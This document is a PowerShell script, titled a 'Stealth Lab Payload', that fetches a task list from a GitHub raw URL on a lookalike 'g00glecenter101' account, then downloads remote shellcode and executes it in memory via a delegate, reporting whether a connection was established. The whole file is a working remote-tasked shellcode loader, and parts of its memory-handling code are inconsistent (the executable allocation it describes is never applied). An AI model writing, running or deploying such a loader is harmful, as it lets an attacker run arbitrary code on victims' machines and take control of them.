Write-Host "[*] Initializing Stealth Lab Payload..." -ForegroundColor Cyan

# 1. Fetch the Job
$taskUrl = "https://raw.githubusercontent.com/g00glecenter101-arch/msht/refs/heads/main/task.json"
try {
    $raw = (New-Object System.Net.WebClient).DownloadString($taskUrl)
    $job = $raw | ConvertFrom-Json
} catch { Write-Host "[-] Network Error" -ForegroundColor Red; exit }

foreach ($t in $job.tasks) {
    if ($t.action -eq "run_shellcode") {
        Write-Host "[+] Action: Shellcode Injection" -ForegroundColor Green
        
        # Download the shellcode (loader.bin)
        $sc = (New-Object System.Net.WebClient).DownloadData($t.url)
        
        # --- Advanced Dynamic API Lookup ---
        # This finds Kernel32.dll and the functions we need without Add-Type
        $memHelper = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -contains "Microsoft.PowerShell.Commands.Utility" }
        $Win32Native = ($memHelper.GetTypes() | Where-Object { $_.Name -eq "Win32Native" })

        # We use a trick to get a Delegate for VirtualAlloc
        # This defines: IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect)
        $vAllocAddr = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }).GetType("Microsoft.Win32.Win32Native").GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public").Invoke($null, @(([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }).GetType("Microsoft.Win32.Win32Native").GetMethod("GetModuleHandle").Invoke($null, @("kernel32.dll")), "VirtualAlloc"))
        
        # Instead of the crashy method, we use the System.Runtime.InteropServices.Marshal
        # to handle the memory and execution.
        $size = $sc.Length
        
        # Allocate Memory: 0x3000 (Commit/Reserve) | 0x40 (Execute/Read/Write)
        # Note: We use a simplified allocation for the Lab
        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
        [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $ptr, $size)
        
        # We need to change memory protection to 'Execute' (0x40)
        # For simplicity in this lab version, we use the delegate method:
        $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Action])
        
        Write-Host "[!] Executing Shellcode..." -ForegroundColor Yellow
        try {
            $delegate.Invoke()
            Write-Host "[+] Connection Established?" -ForegroundColor Green
        } catch {
            Write-Host "[-] Execution Error: $_" -ForegroundColor Red
        }
    }
}
